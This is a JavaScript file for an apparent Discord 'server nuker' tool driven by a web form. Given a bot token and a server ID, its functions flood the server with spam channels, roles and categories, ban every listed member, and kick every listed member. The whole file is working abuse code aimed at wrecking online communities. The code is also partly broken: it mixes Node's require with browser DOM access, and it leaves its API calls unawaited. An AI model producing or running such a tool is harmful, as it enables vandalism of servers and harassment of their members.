const Promise = require('promise');
const axios = require('axios');

// Utility to delay execution for rate limiting
function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

async function nukeServer() {
    const token = document.getElementById('bot_token').value;
    const serverId = document.getElementById('server_id').value;
    const headers = { Authorization: `Bot ${token}` };

    const channelName = document.getElementById('channel_name').value;
    const channelCount = parseInt(document.getElementById('channel_count').value);
    const roleName = document.getElementById('role_name').value;
    const roleCount = parseInt(document.getElementById('role_count').value);
    const categoryName = document.getElementById('category_names').value;
    const categoryCount = parseInt(document.getElementById('category_count').value);

    try {
        console.log('Starting nuking process...');
        for (let i = 0; i < channelCount; i++) {
            await delay(100);
            axios.post(
                `https://discord.com/api/v9/guilds/${serverId}/channels`,
                { name: `${channelName}-${i}` },
                { headers }
            );
            console.log(`Created channel: ${channelName}-${i}`);
        }

        for (let i = 0; i < roleCount; i++) {
            await delay(100);
            axios.post(
                `https://discord.com/api/v9/guilds/${serverId}/roles`,
                { name: `${roleName}-${i}` },
                { headers }
            );
            console.log(`Created role: ${roleName}-${i}`);
        }

        for (let i = 0; i < categoryCount; i++) {
            await delay(100);
            axios.post(
                `https://discord.com/api/v9/guilds/${serverId}/channels`,
                { name: `${categoryName}-${i}`, type: 4 },
                { headers }
            );
            console.log(`Created category: ${categoryName}-${i}`);
        }
    } catch (err) {
        console.error('Failed to nuke the server:', err.message);
    }
}

async function banAllMembers() {
    const token = document.getElementById('bot_token').value;
    const serverId = document.getElementById('server_id').value;
    const headers = { Authorization: `Bot ${token}` };

    try {
        const members = await axios.get(`https://discord.com/api/v9/guilds/${serverId}/members`, { headers });
        for (const member of members.data) {
            await delay(100);
            axios.put(`https://discord.com/api/v9/guilds/${serverId}/bans/${member.user.id}`, {}, { headers });
            console.log(`Banned member: ${member.user.username}`);
        }
    } catch (err) {
        console.error('Failed to ban members:', err.message);
    }
}

async function kickAllMembers() {
    const token = document.getElementById('bot_token').value;
    const serverId = document.getElementById('server_id').value;
    const headers = { Authorization: `Bot ${token}` };

    try {
        const members = await axios.get(`https://discord.com/api/v9/guilds/${serverId}/members`, { headers });
        for (const member of members.data) {
            await delay(100);
            axios.delete(`https://discord.com/api/v9/guilds/${serverId}/members/${member.user.id}`, { headers });
            console.log(`Kicked member: ${member.user.username}`);
        }
    } catch (err) {
        console.error('Failed to kick members:', err.message);
    }
}

function clearInputFields() {
    const fields = document.querySelectorAll('#nukerForm input');
    fields.forEach(field => (field.value = ''));
    console.log('Input fields cleared.');
}

// Attach event listeners to the buttons
document.querySelector('#nukeServer').addEventListener('click', function (e) {
    e.preventDefault();
    nukeServer();
});

document.querySelector('#banAll').addEventListener('click', function (e) {
    e.preventDefault();
    banAllMembers();
});

document.querySelector('#kickAll').addEventListener('click', function (e) {
    e.preventDefault();
    kickAllMembers();
});

document.querySelector('#clearInput').addEventListener('click', function (e) {
    e.preventDefault();
    clearInputFields();
});
